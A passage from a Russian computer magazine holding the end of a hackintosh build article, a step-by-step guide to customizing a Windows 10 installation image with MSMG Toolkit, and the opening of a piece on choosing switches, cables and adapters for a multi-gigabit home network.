ло вполне сносно.





  Передняя панель получилась вполне функциональ ной и прос той в изго‐
  товлении

После окончательной сборки компоновка корпуса оказалась довольно плот‐
ной: SSD, на котором я решил раз местить операционную систему, был прик‐
леен на двусторонний скотч рядом с оптичес ким при водом, а в штатной кор‐
зине для жестких дисков я раз местил терабайтный HDD под данные из своих
старых запасов.





  Окончательный вид собранного хакинтоша — пока без декоративной
  заглушки на задней стенке, которую я смонтировал в самую пос леднюю
  очередь

Задержав дыхание, я подключил комп к сети и нажал на кнопку питания.
Бибикнув динамиком, машина радос тно зашелестела кулерами, а на монито‐
ре появилась заставка BIOS. Мож но приступать к установке софта.


СОФТВАРЬ
Удивительно, но факт: читать ману алы по уста новке macOS на PC намного
страшнее, чем выполнять эту самую установку. Мне удалось справиться
с первого раза. Подготовив загрузочную флешку по инструкции с одного
из сайтов, я установил на SSD своего хакин тоша macOS Catalina.
  На настоящих компьютерах Apple используется EFI со специальной кон‐
фигурацией, препятству ющей заг рузке операционной системы на «неп‐
равильном» железе. Для борьбы с этим явлением наш соотечественник,
известный под ником  slice, раз работал замечательный загрузчик Clover.
На сегодняшний день Clover считается лучшим загрузчиком для хакинтошей,
способным эмулировать EFI‐режим запус ка macOS.
  Мануалов по установке и нас тройке Clover имеется множество как на рус‐
ском, так и на английском языке, а на форуме Applelife есть отдельная ветка,
посвященная загрузчику, которую модерирует сам разработчик программы.
Clover поставляется в виде инсталляционно го пакета .pkg, а для его настрой‐
ки можно воспользоваться либо автоматизированным скриптом CloverGrower,
как это сделал я, либо покопать ся вручную в фай ле config.plist.
  В моем случае установка и нас трой ка Clover заняла от силы минут пят‐
надцать, после чего все прекрасно заработало само. Catalina запустилась
с SSD, и на экране отоб разился долгожданный интерфейс macOS.





                Хакинтош опоз нан как Mac Pro Late 2013

Мой хакинтош опознался как Mac Pro Late 2013, при этом машина прекрасно
ходит в App Store, подключается к iCloud и позволя ет пользоваться всеми
остальными ниш тяками от Apple. Некоторые проблемы возникли только с дву‐
мя девайсами. Во‐пер вых, пос ле выхода из сна в macOS бесслед но про‐
падал звук — эту болезнь уда лось вылечить установкой пакета Voodoo HDA.
Во‐вторых, поначалу у меня не хотел запускаться ни один из найденных
в моих закромах адаптеров Wi‐Fi. На раз личных форумах владельцам хакин‐
тошей советуют приобретать дорогие платы, мимикриру ющие под штатный
беспроводной адаптер Apple, однако проб лему можно решить покупкой
любого дешевого «USB‐свистка», соб ранного на чипе Realtek, к которому
можно найти драйверы для macOS. Я приобрел на AliExpress вот этот, пот‐
ратив на покупку всего 359 рублей. Работает отменно!
  Ко всему про чему выяснилось, что плата не поддерживает одновре мен‐
ную установку модулей серверной памяти с ECC REG и обычной «десктоп‐
ной», хотя по отдельности они работают отлично. Но этого, впрочем, сле‐
довало ожидать. На гонорар от этой статьи я пла нирую докупить пару «бэуш‐
ных» серверных планок DDR3 — плата позволя ет использовать до 32 Гбайт
оперативной памяти. В итоге должен получиться космолет покруче «Звездно‐
го разрушителя», которого хватит еще на пару лет, пока на этом агрегате
не начнут тормозить гра фические редакторы и игры.


ВЫВОДЫ
На всю эпопею, вклю чая покуп ку мелочовки на AliExpress и метизов в «Леруа
Мерлен», у меня ушло порядка 5000 руб лей. В резуль тате получилась годная
рабочая машина, которая лихо уделывает по производительнос ти мой
пятилетний Mac mini с про цес сором Core i5. Да, перед началом сборки хакин‐
тоша у меня был неплохой задел в виде гру ды старых компьютерных комплек‐
тующих, которые я пустил в работу. Но даже без них компьютер вышел бы
намного дешевле, чем «фирменный» мак с ана логичными характеристиками.
  Некоторые «хакин тошестроители» идут в своих разработках еще дальше
и добавляют в конструкцию всевоз можные «свис телки» на Arduino, издающие
при включении питания характерный «эппловский» звук, подбирают Bluetooth‐
адаптеры, лучше всего работающие с фир менной Magic Mouse и бес провод‐
ной клавиатурой от Apple. Одна ко, поскольку этот проект изначально задумы‐
вал ся в концепции «фигак‐фигак и в продакшн», я считаю все эти навороты
излишними. Машина получилась очень дешевой и вполне сердитой, задуман‐
ным  требованиям  к про изво дительнос ти она пол ностью  соответствует
и работает стабильно.
   Что еще нужно обычному юзеру?
ТРЮКИ
 ПОТРОШИМ
   WINDOWS 10

             ЛЕГКИЙ СПОСОБ СОБРАТЬ
         СВОЙ ДИСТРИБУТИВ WINDOWS





                                                                          Валентин Холмогоров
                                                                                              valentin@holmogorov.ru





Сборка собс твенных дистрибутивов ОС — любимое раз вле‐
чение линуксоидов. Считается, что пользователи Windows
лишены  столь прив лекательной возможности проводить
свободное время. Но это не  так: существуют способы
как минимум выпилить из дистрибутива Windows 10 лиш ние
компоненты, отключить ненужные функции, интегрировать
в него драйверы и обновления. Об этом и поговорим
в сегодняшней статье.


Созданием кастомизированных или «облегченных» дистрибутивов винды
юзеры баловались еще в конце прошлого века: например, статья о сборке
минималистического дистрибутива Windows 98  Lite в «Хакере» вы ходила
еще двадцать лет назад. Сайт самого проекта, что уди вительно, жив до сих
пор! Теперь мода вроде бы сошла на нет, но с появлением Windows 10 тема
вновь стала набирать акту альность. На слабень ких планшетах и нетбуках
«десятка» ворочается со скоростью черепахи, а при установке системы
на старые устройства час тенько воз ника ют проб лемы с драйверами, которые
винда не в состоянии найти самос тоятельно.
  Напрашивается  очевидное  решение:  убрать  ненужные  приложения,
отключить лишние ком поненты, интегрировать драйверы и все актуальные
обновления прямо в дистрибутив, после чего отру бить сис тему автоматичес‐
ких обновлений, чтобы не мешала работать. Если ко всему прочему еще и
настроить автоматическую установку Windows, как рассказывалось в пре‐
дыдущей статье, будет вооб ще кра сота. А почему бы, собственно, и нет?


ПОДГОТОВИТЕЛЬНЫЙ ЭТАП
Для  препарирования  дистрибутива  Windows  10  нам  понадобится
как минимум сам дистрибутив Windows 10. О том, где его взять, я уже расска‐
зывал, но кратко повторюсь: нуж но скачать с сайта Microsoft «Средство соз‐
дания носителя Windows 10» и либо сох ранить дистрибутив в виде ISO‐файла,
либо поместить его на флешку. Выбирай наиболее подходящую редакцию
операционной системы — то есть ту, для которой у тебя есть серийник.
  В целях художественного выпиливания из вин ды всего ненужного и добав‐
ления в нее всякого полезного энтузиас ты при думали тул зу MSMG Toolkit.
Утилита поставляется в виде архива  7‐Zip, который нужно распаковать
на диск с сохранением структуры папок.


             INFO

                     Для нормальной работы с образами Windows
                     10 утилита MSMG Toolkit должна быть запущена
                        в Windows версии 8.1 или 10. Конвертацию ESD
                        в WIM можно выполнить и в Windows 7, а вот
                        остальные  фун кции  работать,  скорее  всего,
                      не будут.


Перейди в папку, в которую ты сохранил ISO‐образ Windows 10. Можно смон‐
тировать этот образ на виртуальный диск, но для наших целей дос таточно
установить бесплатный архиватор 7‐Zip и открыть ISO‐файл в нем как обыч‐
ный архив. Если ты записал образ на флешку, можно просто просмотреть ее
содержимое в проводнике. Скопируй все папки и файлы из дистрибути ва
Windows в подпапку DVD той директории, в которую ты распаковал MSMG
Toolkit.
   Теперь запусти MSMG Toolkit с помощью файла Start.cmd из папки с ути‐
литой и нажми на клавиату ре латинскую A, чтобы принять лицензионное сог‐
лашение, а затем клавишу Enter.


ИЗВЛЕКАЕМ И МОНТИРУЕМ ОБРАЗ
В стародавние времена дистрибутивы операционных систем от Microsoft упа‐
ковывались в образы Windows Image Format (WIM). Позже раз работчики отка‐
зались от этого стандарта в пользу формата ESD с еще большей сте пенью
сжатия, чтобы экономить дисковое пространс тво. К сожалению, большинство
современных утилит не умеют работать с ESD, им нужен образ в традици‐
онном WIM‐формате.
  Поэтому в качестве первого шага нам нужно извлечь из файла install.
esd, хранящегося в папке sources, упакованный WIM‐образ. В Windows
за это отвечает консоль ная утилита dism, но ее использование подразуме‐
вает определенные неудобства: как минимум нужно хорошенько наморщить
мозг и вспомнить прин ципы работы с командной строкой. Мы пойдем другим
путем.
  MSMG Toolkit использует собственную копию dism последней версии,
избавив тебя от необ ходимос ти набирать длинные директивы в командной
строке и ломать голову над тем, почему она все равно не работает. Чтобы
сконвертировать install.esd в WIM, нажми клавишу 2. Утилита предложит
разные варианты преобразова ния, тебе нужно выб рать Convert Install ESD im‐
age to WIM image, снова нажав клавишу 2.





              Конверта ция ESD в WIM с помощью MSMG

Тулза прочитает содержимое ESD и выведет на экран спи сок всех образов
Windows, которые хранятся внут ри ESD‐архи ва.





       Выбор нужного образа Windows из содержащихся в архиве

Нажми на клавишу с цифрой, соот ветс твующей тому образу Windows,
с которым ты дальше будешь работать. Теперь дож дись, пока утилита извле‐
чет выбранный тобой образ из ESD‐файла и экспортиру ет его в WIM, это зай‐
мет некоторое время. Сконвертированный образ install.wim будет сох‐
ранен в той же папке sources, где рань ше лежал исходный файл, который
автоматически удаляется.


             INFO

                     Постоянные  читате ли  могут поин тересоваться,
                      почему этот довольно простой метод извлечения
                   WIM не был описан в предыдущей статье. Прак‐
                         тика  показала,  что  утилита  Windows  SIM
                      по какой‐то неизвестной науке причине плохо
                       работает с образами, извлеченными с исполь‐
                       зованием MSMG.


Теперь извлечен ный образ нужно смонтировать для дальнейшей работы.
Нажми клавишу 1 (Source), а затем — еще раз 1 (Select source from folder).
MSMG продемонстрирует список всех обна руженных образов Windows. Наж‐
ми клавишу с цифрой, соответству ющей нужной версии ОС. От предложения
смонтировать загрузочный образ (Do you want to mount Windows Boot Inage?)
и образ восстановления (Do you want to mount Windows Recovery Inage?) отка‐
зываемся, нажав клавишу N. Вскоре программа сооб щит об успешном мон‐
тировании образа.





                Об раз успешно смонтирован

Теперь можно сме ло приступать к дальнейшим действиям.


ИНТЕГРИРУЕМ ДРАЙВЕРЫ, ОБНОВЛЕНИЯ И ЯЗЫКОВЫЕ ПАКЕТЫ
У Windows 10 далеко не всегда получается найти драй веры устройств в авто‐
матическом режиме. Если  ты  устанавливаешь  систему  на компьютер,
для которого у тебя уже имеется запас драйверов, их можно сразу интегри‐
ровать в дистрибутив и сэкономить таким обра зом время. То же самое каса‐
ется обновле ний ОС: ты сможешь избежать утомительной процедуры ска‐
чивания и установки вышедших апдейтов, заранее добавив их в дистрибутив
Windows 10.
   Скачай все обновления для твоей редакции Windows с сайта Microsoft
и помести их в соот ветс тву ющую под папку директории Updates\w10: x64
для 64‐разрядной версии Windows и x86 — для 32‐разрядной. Драй веры нуж‐
но скопировать в папки x64 и x86, которые можно найти в директории
\Drivers\Install\w10. Проследи за тем, чтобы раз рядность драй веров
и разрядность папок их размещения совпадали.
  В рабочей папке MSMG есть директория \Packs\LanguagePacks\w10.
В ней — набор папок, соот ветс твующих редакциям Windows, а в них, в свою
очередь, размещены подпапки, соответс твующие разряднос ти ОС. Если ты
хочешь интегрировать в дистрибутив недос тающий языковой пакет, перей ди
в нужную папку, создай в ней подпапку (если ее не существует) с именем,
совпадающим с именем добавляемого пакета, например ru‐RU для русского
языка или fr‐FR для француз ского, и помести туда фай лы язы кового пакета
в формате .cab.
  В глав ном меню MSMG нажми клавишу 3, чтобы выбрать опцию Integrate.





     Интеграция в дистрибутив Windows дополнительных компонентов


           WARNING

                    Не  интегрируй  в  дистрибутив  обновления
                      перед  интеграцией  языковых  пакетов!  Необ‐
                      ходимо  сначала  интегрировать  все  языковые
                       пакеты и только потом — хотфиксы, сервис‐паки
                      и патчи, имеющие в своем составе ресурсы,
                       которые зависят от языковой локализации. В про‐
                        тивном случае есть ненулевой шанс, что язы‐
                      ковые компонен ты обновлений не применятся
                        в операционной системе правильно.


При интеграции языковых пакетов наж ми клавишу 1, подтверди свой выбор
(клавиша Y), а затем выбери вариант Integrate to Windows Installation Image
(клавиша 2). Затем введи языковой код интегри руемого пакета, выб рав его
из списка.





                  Ин теграция языковых пакетов

Интеграция драйверов выполняет ся ана логичным образом: в главном меню
MSMG нажми на клавишу 3 (Integrate), затем — 2 (Windows Drivers), еще раз 2
(Integrate to Windows Installation Image) и, наконец, под тверди свой выбор
нажатием клавиши Y.
  В последнюю очередь рекомендуется интегрировать обновления. Наж‐
ми 3 (Integrate), затем 4 (Windows Updates), сог ласись продол жить интегра‐
цию нажатием клавиши Y, пос ле чего нажми 1 (Integrate Windows Updates).


УДАЛЯЕМ ЛИШНЕЕ
С помощью MSMG Toolkit можно выпилить из дис трибутива Windows встро‐
енные  программы и  Metro‐приложения, которыми ты не пользуешься.
Для этого в главном меню нажми клавишу 4 (Remove), а затем — 1 (Remove
Windows Components). Тебе будет предложено на выбор нес колько разделов:
 • [1] Internet — вклю чает Adobe Flash for Windows и Internet Explorer;
 • [2] Multimedia — семь компонентов, в том числе Speech Recognition, Win‐
   dows Media Player и Windows Photo Viewer;
 • [3] Privacy — 11 разных служб, свя занных с дос тупом к системе и безопас‐
   ностью;
 • [4] Remoting — включает Home Group, MultiPoint Connector и Remote
   Assistance;
 • [5] System — встроенные приложения, такие как графический редактор
    Paint, System Restore, Windows Subsystem for Linux, всего восемь штук;
 • [6] System Apps — 26 приложений, включая проводник, Microsoft Edge,
   Cortana, Skype;
 • [7] Windows Apps‐1 — стандартные приложения, в том числе калькулятор,
   Paint 3D, Messaging, Microsoft Pay, всего 35 штук;
 • [8] Windows Apps‐2 — приложения Windows Store, Xbox App и Xbox Identity
   Provider.

Выбранные программы будут безжалос тно выпилены из дистрибутива и не
станут устанавливаться на твое устройство, таким образом экономится дис‐
ковое пространство. В некоторых версиях Windows экран Remove содержит
также функцию Remove Default Metro Apps — с ее помощью можно удалить
ненужные Metro‐приложения.


ДОПОЛНИТЕЛЬНЫЕ ВОЗМОЖНОСТИ КАСТОМИЗАЦИИ
С использованием MSMG Toolkit мож но добавить в дистрибутив дополнитель‐
ные файлы и элементы: шрифты, аватарки учетных записей Windows, курсоры,
любые системные файлы, объекты Windows Recovery Environment, темы
оформления Metro‐приложений (проигрывателя Windows, Photo Viewer, каль‐
кулятора).
  Все эти файлы нужно предваритель но положить в соответству ющие под‐
папки директории \Custom\Files\w10\ x64 или \Custom\Files\w10\ x86,
после чего выбрать в меню MSMG Toolkit пункт 3 (Integrate), затем — 5 (Win‐
dows Custom Features) и, наконец, нажать Y. Интегрируемые объ екты можно
будет выбрать в предложенном списке.





         Допол нительные возможности кастомиза ции Windows


           WARNING

                    При добавлении компонентов с помощью этой
                     функции следует помнить, что утилита SFC будет
                         ругаться на нарушение целостности системных
                    файлов Windows. С этим придет ся смириться.


Дополнительно ты можешь изменить ряд базовых настроек Windows, выбрав
в меню MSMG команды 5 (Customize) — 8 (Apply Tweaks). Здесь можно сде‐
лать с виндой следующее:
 • отключить Cortana;
 • убрать кнопку TaskView с панели задач;
 • отключить автоматическое обновление драйверов с помощью Windows
   Update;
 • отключить автоматическую загрузку и установку сторонних при ложе ний;
 • выключить Windows Defender;
 • отключить автоматические обновления Automatic Windows Upgrade и Win‐
   dows Update;
 • выключить резервирование дискового пространс тва для обновлений (Dis‐
   able Microsoft Reserved Storage Space for Windows Updates);
 • заставить программы .NET использовать новейший .NET Framework;
 • вклю чить программу прос мотра изоб ражений Windows Photo Viewer (по
   умолчанию она отключена);
 • вклю чить кодек Fraunhofer MP3 Professional.





        Здесь можно воспользоваться допол нительными твиками


СОХРАНЯЕМ ИЗМЕНЕНИЯ
Когда все готово, в главном меню MSMG Toolkit выполни команды 6 (Apply)
и 2 (Apply & Save Changes to Source Image). Теперь нажми клавишу 7 (Target)
и выбери, в каком формате ты хочешь сохранить обновленный дистрибутив.





                 Сохраня ем результат своих трудов

Ты можешь создать ISO‐файл для последующего прожига образа на оптичес‐
кий диск, сразу записать дистрибутив на DVD‐болванку или скопировать его
на USB‐флешку. Можно переза писать измененный загрузчик и образ Win‐
dows на ранее созданную флешку с дистрибутивом (Sync Source Boot & Install
Images to USB Flash Drive) или соз дать новую заг рузочную флешку с дистри‐
бутивом, используя функцию Burn an ISO Image to Bootable USB Flash Drive.
Нажатие на клавишу 6 отформатирует флешку перед записью.


ПОСЛЕСЛОВИЕ
С использованием MSMG Toolkit можно создать «облегченный» дистрибутив
Windows 8.1 или 10 для установки на планшет, нет бук или устаревший компь‐
ютер — программа позволит сэконо мить дисковое прос транство за счет уда‐
ления ненужных компонентов и приложений. Кроме того, ты можешь сэконо‐
мить время, если заранее интегрируешь в Windows все необходимые
обновления и драйверы, а также оптимизировать рабочую среду, отключив
неиспользуемые функции операционной системы.
ТРЮКИ

     ПОСЛЕ
ГИГАБИТА





  ВЫБИРАЕМ И НАСТРАИВАЕМ ОБОРУДОВАНИЕ
   ДЛЯ СУПЕРСКОРОСТНОЙ ДОМАШНЕЙ СЕТИ





Стандарту, описыва ющему гигабитный Eth‐
ernet, скоро исполнится 22 года. До сих пор
именно гигабитные сети работают прак‐
тически у всех домаш них пользователей и в
подавляющем большинстве офисов. Пре‐           Олег Афонин                                                                                      Эксперт по мобильной
одоление  гигабитного  предела  было…       криминалистике«Элкомсофт»компании
сложным,  тернистым  и  неоднозначным.        aoleg@voicecallcentral.com
И  если  для  крупных  инфраструктурных
предприятий вопрос с 10‐, 20‐ и даже 40‐
гигабитным  Ethernet  давно  решен,  то
для дома и офиса ускорение сетевых ком‐
муникаций за пределы одного гигабита —
задача не  всегда  тривиальная. О  том,
как организовать мультигигабитную сеть
дома по обычному сетево му кабелю, —
в этой статье.


НЕМНОГО ИСТОРИИ
Официальным годом принятия стандарта, описывающего 10‐гигабитный Eth‐
ernet (10GE, 10GbE или 10 GigE), считается 2002‐й (IEEE 802.3ае‐2002),
но этот стандарт описывал передачу данных исклю чительно по оптоволокну.
Оптоволоконные 10‐гигабитные сети получи ли широкое рас пространение
в узких кругах, однако для домашнего при менения использовать оптоволокно
не слишком рационально: дорого, слож но, как правило — шумно и не слиш‐
ком гибко.
  Два года спустя 10‐гигабитная скорость была стандартизована по мед‐
ному твинаксиальному кабелю (практичес ки коаксиал, только с двумя про‐
водами). И лишь в 2006 году 10 Гбит были дос тигну ты в мед ной витой паре
с характерным обжимным разъемом, хорошо известным любому, кто хоть раз
подклю чал сетевое устройство. Именно этот стандарт, 10GBASE‐T, представ‐
ляет интерес для домаш них пользователей, и именно о нем (и его более
новых, но менее быстрых соб рать ях — 2.5GBASE‐T и 5GBASE‐T) мы сегод ня
и поговорим.
  Определенный интерес представляет и клас сический способ агре гации
линков, часто позволя ющий добить ся пос тавленной цели и без обновления
сетевой инфраструктуры. Об этом способе мы тоже обязательно погово‐
рим — как и о сопутствующих подводных камнях и мифах, его окру жающих.


ДЛЯ ЧЕГО ЭТО НУЖНО ДОМА?
Для  чего  нужна  мультигигабитная  коммутация  дома?  Нет,  в  слу чае
с инфраструктурными предприятиями и дата‐центра ми такого вопроса даже
не возникает, но дома? Зачем, если не брать в расчет очу мелые ручки
и избыток свободного времени?
   Во‐первых (и, наверное, в‐пос ледних) — мультигигабитная коммутация
нужна, если ты исполь зуешь сетевые хра нилища. Любой, даже самый мед‐
ленный жесткий диск, который будет уста новлен в NAS от Synology, QNAP
или Asustor, с избытком преодолеет барьер, накладываемый гигабитным лин‐
ком. Даже единичный жес ткий диск способен обеспечить скорость чте‐
ния‐записи порядка 225 Мбайт/с на внеш них дорожках, минимум 110–
119 Мбайт/с на самых внутренних и порядка 150 Мбайт/с в середине. Если
использовать «зеркальный» RAID, то скорость чтения возрастет вдвое, а если
брать RAID 0, то вдвое вырастет скорость записи. Таким образом, гигабитный
линк становится тем самым бутылочным горлышком, которое не дает рас‐
крыться всему потенциалу, заложенному в сетевые хранилища и современ‐
ные жесткие диски.
  Один из вариантов — отка зать ся от NAS и перейти на DAS (Direct Attached
Storage, пресловутые внешние корпуса с USB), но сценарий их исполь‐
зования заметно отличает ся от сценария исполь зования сетевых хранилищ.
  Другой альтернативой будет агрегация портов Ethernet — если в твоем
сетевом хранилище установлено хотя бы два сетевых выхода. Впрочем,
у такого решения подводных камней чуть ли не боль ше, чем у мультигигабит‐
ной сети. Во‐первых, агрегацию надо настроить не только в NAS, но и на каж‐
дом клиентском устройстве — а это зна чит, что тебе придется добавить вто‐
рой сетевой адаптер в каждый компь ютер, для которого нужна высокая ско‐
рость доступа к данным. Более того, потребуется проложить не один, а два
сетевых кабеля — как в сторону NAS, так и в сторону компьюте ра. Наконец,
тебе нужен будет коммутатор с дос таточным количес твом свобод ных портов.
И если уж все равно приходится докупать вто рой сетевой адаптер и новый
коммутатор, то почему бы не взять сразу с поддержкой мультигигабитной
сети? Впрочем, о том, как можно нас троить агрегацию, мы тоже обязательно
поговорим — и для этого есть серьезные причины даже в том слу чае, если ты
озаботился покупкой мультигигабитного коммутатора.
   Начнем с подбора компонентов.


КОМПОНЕНТЫ
Какие компоненты нужны для создания мультигигабитной сети? Тебе пот‐
ребуется докупить или обновить следующие устройства:
 1. Сетевой коммутатор (свитч).
 2. Сетевые кабели (обя зательно для сегмента на 10 Гбит, для 2,5 и 5 можно
  обойтись старыми).
 3. Сетевой адаптер или адаптеры для компь ютера (PCIe). Обычная плата
   расширения — но столько тонкостей! О них — чуть ниже.
 4. Сетевой адап тер для NAS (PCIe, USB или USB‐C).


Се тевой коммутатор
Без правильного сетевого коммутатора  (свитча) установить скорос тное
соединение тебе удастся раз ве что в режиме точка — точка. С одной сто‐
роны, тоже хлеб, но с другой — глобальный смысл мероприятия при этом
теряется.
  При выборе коммутато ра рекомендую обратить вни мание на модели, под‐
держивающие не толь ко абстрактный стандарт 10Gbe, но и конкретно 10G‐
BASE‐T (10 Гбит по витой паре, а не по оптоволокну). Более того, сегодня
имеет смысл брать коммутатор, поддерживающий не только 10 Гбит, но и
более сов ременные стандарты 2.5GBASE‐T и 5GBASE‐T; в противном случае
в будущем ты можешь столкнуться с неприятным сюрпризом, когда муль‐
тигигабитный линк не заведется прос то потому, что подключенное устрой ство
поддерживает только 2,5 или 5 Гбит.
   Какие здесь могут быть подводные камни? Их множество. Начнем с того,
что подав ляющее большинс тво 10‐гигабитных коммутаторов на рынке —
это модели для бизнеса и дата‐центров. Как пра вило, они оборудуются пор‐
тами SFP+, предназначенными для оптоволоконного под ключения, и не под‐
держивают стан дарты 2,5 и 5 Гбит. Такие свитчи мы отме таем.
  Следующее поколение свитчей поддерживает 10‐гигабитную коммутацию
по стандарту 10GBASE‐T — то есть теоретически их можно использовать.
Но все виденные мной коммутаторы, в которых установлено больше двух
высокоскоростных портов, используют активное охлаждение — шумные,
свистящие из‐за неболь шого размера вен тиляторы. Я не стал бы устанав‐
ливать такое домой; впрочем, это воп рос личных предпочтений.
  Наконец, свитчи с поддержкой мультигигабитных линков (2,5, 5 и 10 Гбит).
Для домаш него применения их обычно выпус кают в конфигурации 8 + 2,
где 8 — число гигабитных портов, а 2 — мультигигабитных (опять же обрати
внимание, чтобы поддерживались стандарты помимо 10 Гбит). Такие свитчи
бесшумны, относительно недороги (в Европе порядка 180–220 евро) и впол‐
не доступны обычному пользователю, но и здесь не обошлось без своих
минусов.
   Есть еще одна важная, но неочевидная особенность. В стремлении
сэкономить некото рые производители реализуют мультигигабитные ком‐
мутаторы в виде двух отдельных свитчей — один обычный 8‐портовый
гигабитный, вто рой — с дву мя мультигига битными линками. При этом внут‐
ренняя коммутация между этими двумя час тями про изводится по гигабитному
каналу — замечательный способ сэконо мить на «лишнем» мультигигабитном
линке. Почему это важно? Если тебе попадется такой свитч, то максимальная
суммарная скорость передачи данных меж ду компьютером (10‐гигабитный
линк) и все ми восемью гигабитными портами не превысит одного гигабита.
То есть ты не сможешь, например, подключить NAS с двумя выходами Ether‐
net, настроить агрегацию гигабитных линков и наслаждаться удвоенной
полосой пропускания. Отмечу, что все извес тные мне модели, использующие
этот трюк, были неуправляемыми (unmanaged); впрочем, это не отменяет
возможности встретить такую схему и в управля емом свитче.
  Для себя я выбрал коммутатор Nighthawk SX10 (пол ное название — NET‐
GEAR GS810EMX‐100PES Nighthawk Pro Gaming SX10). Данная модель выпол‐
нена по схе ме 8 + 2. Внутренняя коммутация меж ду гигабитными и муль‐
тигигабитными портами выполнена на скорос ти 10 Гбит. Забегая вперед,
скажу, что я смог получить удвоенную (честные 2 Гбит) полосу пропус кания
при использовании агрегации линков на стороне NAS и единственного
сетевого кабеля, подключенного к компь ютеру. После месяца использования
работает коммутатор ста бильно.


Настройка коммутато ра
Удивительно, но никакой особой нас трой ки не потребовалось. Включил —
работает, полный plug’n’play. Мож но при желании под крутить цвета све тоди‐
одов для каждого из сетевых портов и цвет светоди ода питания, можно нас‐
троить QoS или VLAN. А вот настройку агрегации портов советую пока отло‐
жить: есть вероятность, что даже при ее использовании на стороне NAS тебе
не придется ничего настраивать в коммутаторе.


Се тевые кабели
Сетевые администраторы прекрасно раз бира ются в категориях и типах
сетевых кабелей, но для обычного пользователя даже разница между Cat. 5e
и Cat. 6 неочевидна; Cat. 7 считается лучше, чем Cat. 6a, а разницу между
S/FTP и F/UTP он, скорее всего, и вовсе проигнориру ет как несущественную.
  Не буду вдаваться в подробнос ти и я. Ска жу лишь, что для гигабитных пор‐
тов вполне достаточ но уже имеющихся у тебя кабелей категории Cat. 5e.
Разумеется, если это качес твенные кабели: мне попал ся бракованный Cat. 6,
по которому сторонам удавалось догово риться лишь о скорости в 100 Мбит/
с.
  Для мультигигабитных портов тебе потребуются следующие кабели.
 1. Для 2,5 и 5 Гбит можно попробовать Cat. 5e или Cat. 6, если они у тебя
   уже есть. Кабель категории Cat. 6a совершенно не помешает; Cat.
   7 для наших целей не имеет практических отличий от Cat. 6a (но при этом
   дороже), а вот Cat. 8 имеет, и при воз можнос ти (и наличии лишних денег)
   лучше взять имен но его. Но, повторюсь, все может заработать и на обыч‐
   ных кабелях — стандарты 2.5GBASE‐T и 5GBASE‐T разрабаты вались
   с учетом требований обратной совместимос ти.
 2. А вот для 10-гигабитного порта обя зательно использование кабеля
   категории Cat. 6a или выше. С прицелом на будущее (особенно в случае
   скрытой прокладки, ког да замена кабеля превращается в приключение)
  имеет смысл проложить кабель категории Cat. 8; его уж точно хватит
   с запасом и надол го.


Се тевая карта для компьюте ра
Что интересного можно сказать о сетевой карте, даже мультигигабитной?
Оказывается, сказать можно довольно много, но при этом мало хорошего.
   Будучи в какой‐то мере снобом, я воз желал сетевую карту на чипсете
от Intel. Ethernet от Intel — это обычно быстро, беспроблемно и с максималь‐
ным освобождением центрального процес сора от той работы, которую может
выпол нить сетевой адаптер.
  Однако довольно быстро я уяс нил, что Intel делает сетевые карты на счи‐
таном количестве чипсетов, на которые наз начен двойной по сравнению
с конкурентами ценник. Более того, многие адаптеры от Intel поддерживают
скорости либо 1, либо 10 Гбит — без про межу точных стандартов. Наверное,
единственный чипсет от Intel с поддержкой всего спектра стандартов 1, 2,5, 5,
10 Гбит по медному проводу — это Intel X550, сетевую карту на котором мож‐
но приобрести примерно за 200 евро. А вот более старый (PCIe2.0) адаптер
на Intel X540 стоит в полтора раза дешевле, но никаких промежу точных стан‐
дартов не поддерживает. Из‐за высокой цены от адап тера на X550 мне приш‐
лось отказаться, но, если твой бюджет поз воляет, это, наверное, лучший
вариант из доступного на сегодняшний день.





                                            Intel X550

Осмотревшись по сторонам, я обна ружил альтернативного производите ля
мультигигабитных чипсетов — компанию Aquantia. Для карт рас ширения
в формате PCIe предназна чен чип сет Aquantia AQtion AQC107, который уста‐
навливается в считаное количество сетевых адаптеров.
  Наиболее распростра нены из них два: ASUS XG‐C100C и QNAP QXG‐
10G1T. Отзывы о карте ASUS противо речи вы: не всем везет с радиатором (у
некоторых карта перегрева ется). Кро ме того, у ASUS XG начисто отсутс твует
функция Wake On LAN (WOL), что и отвра тило меня от ее покупки.





                      ASUS XG‐C100C

В результате я выбрал QNAP QXG‐10G1T.





                    QNAP QXG‐10G1T

В драйверах и прошив ках Aquantia время от времени обнаруживаются баги,
но за полтора года с выхода большинство из них исправили. Сразу пос ле
покупки сле дует установить пос леднюю версию драйверов с сай та произво‐
дителя, обновить прошивку специальной утилитой и, пожалуй, настроить MTU
= 9000.
  За месяц активного использования, в том числе 20‐часового стресс‐тес‐
та, я не обнаружил каких‐либо проблем с этим адаптером.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ

     ПОСЛЕ ГИГАБИТА
        ВЫБИРАЕМ И НАСТРАИВАЕМ ОБОРУДОВАНИЕ
          ДЛЯ СУПЕРСКОРОСТНОЙ ДОМАШНЕЙ СЕТИ





Се тевой адаптер для NAS
Это, пожалуй, самый интересный раздел. Далеко не каждый NAS можно
использовать с мультигигабитным адаптером, и далеко не каждый произво‐
дитель поддерживает мультигигабитные адаптеры в принципе. Адаптеры
на 10 Гбит доступны лишь для ограниченного чис ла моделей (как правило,
через  слот расширения  PCIe); для большинс тва прочих предлагаются
или адаптеры на 2,5 и 5 Гбит (уже оценил совет о выборе правильного ком‐
мутатора?), или ничего. Рассмотрим подробнее.


QNAP
В лагере QNAP дела обстоят хорошо. Компания производит не один и не два,
а целых шесть (!) разных адаптеров — на любой вкус. В отличие от Synology,
многие адаптеры QNAP подходят как для собс твенных NAS компании, так
и для компьютеров — имен но в таком качестве я использовал соответству‐
ющую плату расширения. С полным списком вариантов можно ознакомиться
на официальной странице.
   Если брать карту с прицелом на установку в компь ютер, то инте рес пред‐
ставляют в первую очередь решения с пас сивным охлажде нием. Если же пла‐
нируется установить соответс тву ющую карту только и именно в NAS от QNAP,
то подойдет модель с вентилятором.
 • QXG‐10G1T: мультигига битная сетевая карта в формате PCIe на чипсете
   Marvell AQtion AQC107. Годится как для компь ютеров, так и для NAS (в ком‐
   плекте — несколько заглушек для уста новки в раз ные корпуса). Поддержи‐
   вает все необходимые стандарты — 10, 5, 2,5 и 1 Гбит. Цена — око‐
   ло 100 евро.
 • QXG‐5G1T‐111C: сетевая карта с поддержкой скоростей до 5 Гбит со все‐
  ми остановками на чипсете Marvell AQtion AQC111C. Вдвое медленнее 10‐
   гигабитного варианта, но и почти вдвое дешевле — около 50 евро.





                   QNAP QXG‐5G1T‐111C

